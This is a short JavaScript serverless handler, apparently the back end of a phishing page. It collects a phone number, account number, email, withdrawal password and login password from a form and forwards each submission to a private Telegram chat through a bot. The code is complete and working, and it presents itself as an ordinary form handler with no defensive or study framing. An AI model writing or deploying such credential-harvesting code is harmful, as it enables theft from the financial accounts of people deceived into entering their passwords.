export default async function handler(req, res) {

    // Only allow POST requests
    if (req.method !== "POST") {
        return res.status(405).json({
            error: "Method not allowed"
        });
    }

    try {

        // Get the submitted form data
        const {
            phone,
            account,
            email,
            withdrawal,
            login
        } = req.body || {};


        // Make sure all fields were provided
        if (!phone || ! account || !email || ! withdrawal || !login) {

            return res.status(400).json({
                error: "Please fill in all fields."
            });

        }


        // Message that will be sent to Telegram
        const message =
`📩 NEW FORM SUBMISSION

👤 Phone: ${phone}

📱 Account Number: ${account}

📧 Email: ${email}

📡 Withdrawal Password: ${withdrawal}

📍 Login Password: ${login}`;


        // Send the message to Telegram
        const telegramResponse = await fetch(

            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,

            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({

                    chat_id: process.env.TELEGRAM_CHAT_ID,

                    text: message

                })

            }

        );


        const telegramResult =
            await telegramResponse.json();


        // Check if Telegram accepted the message
        if (!telegramResult.ok) {

            console.error(
                "Telegram API error:",
                telegramResult
            );

            return res.status(500).json({
                error: "Could not send the submission to Telegram."
            });

        }


        // Everything worked
        return res.status(200).json({
            success: true
        });


    } catch (error) {

        console.error(
            "Server error:",
            error
        );

        return res.status(500).json({
            error: "Server error. Please try again."
        });

    }

}